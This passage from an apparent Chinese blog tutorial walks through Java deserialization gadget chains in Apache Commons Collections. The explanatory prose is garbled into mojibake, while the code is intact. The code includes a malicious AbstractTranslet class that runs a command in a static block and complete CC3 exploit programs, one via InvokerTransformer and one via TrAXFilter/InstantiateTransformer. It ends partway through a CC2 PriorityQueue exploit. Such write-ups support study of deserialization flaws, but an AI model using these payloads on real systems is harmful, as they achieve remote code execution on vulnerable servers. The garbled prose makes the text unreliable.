æ³•å‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸ªé—®é¢˜æ˜¯å‡ºåœ¨æ¶æ„ç±»ä¸Šæˆ‘ä»¬ä¸‹æ–­ç‚¹è°ƒè¯•<br><img src="/2024/09/25/CC%E9%93%BE/CC3_13.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC3_14.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°åªè¦æˆ‘ä»¬æ¶æ„ç±»çš„çˆ¶ç±»çš„å€¼ç­‰äºABSTRACT_TRANSLETå°±ä¼šå¯¹_transletIndexèµ‹å€¼ï¼Œä¸”ä¸ä¼šè¿›å…¥elseå³ä¸ä¼šæŠ¥é”™ï¼Œè€Œä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå¯¹_transletIndexçš„åˆ¤æ–­å¦‚æœå°äº0å°±æŠ›å‡ºå¼‚å¸¸ï¼Œå³æˆ‘ä»¬çš„æ¶æ„ç±»çš„çˆ¶ç±»åè¦ä¸ºABSTRACT_TRANSLETå³å¦‚ä¸‹ç±»<br><img src="/2024/09/25/CC%E9%93%BE/CC3_12.png" class="" title="alt text"><br>æ¶æ„ç±»ä»£ç å¦‚ä¸‹å³å¯å‘½ä»¤æ‰§è¡Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆè¿™æ¡é“¾çš„å‰åŠæ®µæˆ‘ä»¬å·²ç»å†™å®Œäº†<br>å…¶å‰åŠæ®µå…¶å®å°±æ˜¯ä½¿ç”¨CC1æ¥åå°„newTransformeræ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        tmpl.newTransformer();</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tmpl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line"></span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿›ä¸€æ­¥çš„å‘ä¸Šå¯»æ‰¾ï¼Œæ¥ä¸ä½¿ç”¨InvokerTransformerè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>æˆ‘ä»¬å†å¾€ä¸Šæ‰¾å¯ä»¥æ‰¾åˆ°TrAXFilterè¿™ä¸ªç±»ï¼Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ„é€ æ–¹æ³•è°ƒç”¨äº†templates.newTransformer()ã€‚ä½†æ˜¯å› ä¸ºå…¶æ˜¯æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬è¦è§¦å‘åªèƒ½é€šè¿‡å®ä¾‹åŒ–æˆ–è€…åå°„ã€‚<br>è€Œæˆ‘ä»¬åœ¨InstantiateTransformerä¸‹å¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ªtransformã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                  <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                      + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">          <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™transformæ¥å®ä¾‹åŒ–TrAXFilterä»è€Œè§¦å‘å™¨æ„é€ æ–¹æ³•ä»è€ŒåŠ è½½å­—èŠ‚ç å‘½ä»¤æ‰§è¡Œ<br>expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2æ˜¯collections4çš„ä¸€æ¡é“¾ï¼Œè™½ç„¶CC1,3ï¼Œ6éƒ½æ˜¯collections3.1çš„é“¾å­ä½†æ˜¯å…¶å®åªè¦å°†LazyMapæˆ–è€…TransformedMapçš„æ„é€ å™¨ç”±decorateæ”¹ä¸ºlazyMapæˆ–è€…transformedMapå³å¯å‘½ä»¤æ‰§è¡Œ<br><img src="/2024/09/25/CC%E9%93%BE/CC2_1.png" class="" title="alt text"></p><p>å¥½äº†æ¥ä¸‹æ¥å¼€å§‹è®²CC2<br>CC2çš„é“¾å…¶å®ä¹Ÿå°±æ˜¯å¼€å¤´ä½ç½®å‘ç”Ÿäº†æ›´æ”¹ã€‚å³å¼€å¤´å˜ä¸ºäº†PriorityQueue-&gt;TransformingComparator-&gt;TransformingComparator.transform()</p><p>ä»PriorityQueueåˆ°TransformingCompartorçš„è¿‡ç¨‹å¦‚ä¸‹readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;compare-&gt;transformå¦‚ä¸‹<br><img src="/2024/09/25/CC%E9%93%BE/CC2_3.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_4.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_5.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_6.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC2_2.png" class="" title="alt text"><br>çŸ¥é“è¿™ä¸¤ä¸ªçš„è°ƒç”¨è¿‡ç¨‹æˆ‘ä»¬å°±å¯ä»¥ç®€å•çš„ç¼–å†™å‡ºexpäº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC2</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser_c.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer[] transformers=<span class="keyword">new</span> <span class="title 